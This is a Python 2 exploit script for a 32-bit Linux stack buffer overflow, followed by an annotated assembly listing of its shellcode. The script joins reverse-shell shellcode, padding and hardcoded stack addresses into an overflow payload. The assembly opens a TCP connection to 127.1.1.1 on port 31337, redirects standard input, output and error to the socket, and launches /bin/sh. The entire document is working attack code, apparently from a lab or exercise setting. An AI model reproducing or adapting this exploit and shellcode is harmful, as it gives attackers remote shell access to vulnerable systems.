from struct import pack

shellcode = ("\x31\xc0\x31\xdb\x6a\x06\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80")

padding = "0"*(2048-len(shellcode))
shellcodeaddr = pack("<I", 0xbffea638)
retaddr = pack("<I", 0xbffeae4c)

print shellcode + padding + shellcodeaddr + retaddr

'''
.global _main
.section .text

_main:

// Socketcall socket creation
// socketcall type = 1
// sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

xorl    %eax,%eax       // zero out eax
xorl    %ebx,%ebx       // zero out ebx
pushl   $6              // push 6 (IPPROTO_TCP)
movb    $102,%al        // set eax to 102 (socketcall)
movb    $1,%bl          // set ebx to 1 (socket)
push    $1              // push 1 (SOCK_STREAM)
push    $2              // push 2 (AF_INET)
movl    %esp,%ecx       // save ptr to socket() args
int     $0x80           // syscall - socketcall(socket(2,1,6))

// Socketcall connect
// socketcall type = 3
// connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
// bind(sockfd=edx, [AF_INET, PORT, IP], 16)

movl    %eax,%edx       // move sockfd into edx
xorl    %eax,%eax       // zero out eax
xorl    %ebx,%ebx       // zero out ebx
movb    $102,%al        // set eax to 102 (socketcall)
movb    $3,%bl          // set ebx to 3 (socket)
pushl   $0x0101017f     // push IP "127.0.0.1"
                        // but since \x00 cannot be read we pass "127.1.1.1"
pushw   $0x697a         // push port 31337
pushw   $2              // push 2 (AF_INET)
movl    %esp,%ecx       // save ptr to [AF_INET, PORT, IP]
pushl   $16             // push 16 (sizeof(addr))
pushl   %ecx            // push [AF_INET, PORT, IP]
pushl   %edx            // push sockfd
movl    %esp,%ecx       // save the new stack ptr
int     $0x80           // syscall - socketcall(connect())

// Redirect stdin(0), stdout(1), stderr(2)
// dup2(oldfd, newfd);

movl    %edx,%ebx       // set ebx to the ret value of our socketcall (sockfd)
// stdin
xorl    %ecx,%ecx       // zero out ecx
movb    $63,%al         // set eax to 63 (syscall # for dup2)
int     $0x80           // syscall - dup2
// stdout
incl    %ecx            // increment ecx to 1
movb    $63,%al         // set eax to 63 (syscall # for dup2)
int     $0x80           // syscall - dup2
// stderr
incl    %ecx            // increment ecx to 2
movb    $63,%al         // set eax to 63 (syscall # for dup2)
int     $0x80           // syscall - dup2

// call execve
// execve(/bin//sh, &/bin//sh, 0)

xorl    %eax,%eax       // zero out eax
pushl   %eax            // push 0 (null-terminator)
pushl   $0x68732f2f     // push "//sh"
pushl   $0x6e69622f     // push "/bin"
movl    %esp,%ebx       // set ebx to stack ptr
xorl    %ecx,%ecx       // zero out ecx
xorl    %edx,%edx       // zero out edx
movb    $11,%al         // set eax to 11 (syscall # for execve)
int     $0x80           // syscall - execve("/bin//sh",0,0)
'''

